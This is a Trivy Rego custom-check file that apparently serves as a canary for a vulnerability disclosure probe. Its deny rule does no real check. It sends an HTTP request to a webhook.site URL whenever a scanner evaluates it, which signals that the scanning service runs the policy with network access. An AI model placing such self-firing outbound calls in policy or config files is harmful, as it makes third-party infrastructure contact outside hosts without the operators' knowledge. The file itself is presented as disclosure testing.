# METADATA
# title: "RUNNERDEEP canary - user namespace discriminator"
# description: "Authorized CodeRabbit VDP fixture. Evaluates only when the user package namespace is enabled via --namespaces user / rego.namespaces."
# custom:
#   avd_id: AVD-RD-0003
#   id: RD-TRIVY-0003
#   severity: CRITICAL
package user.dockerfile.rduser

deny_user[res] {
  http.send({
    "method": "GET",
    "url": "https://webhook.site/cb2d5142-ce78-4bcd-9c96-b4377e044f86/rd-trivy-httpsend-user",
    "raise_error": true,
    "force_json_decode": false,
  })
  res := {
    "msg": sprintf("RD_TRIVY_USER_RD_156930_%d", [time.now_ns()]),
    "startline": 1,
    "endline": 1,
  }
}
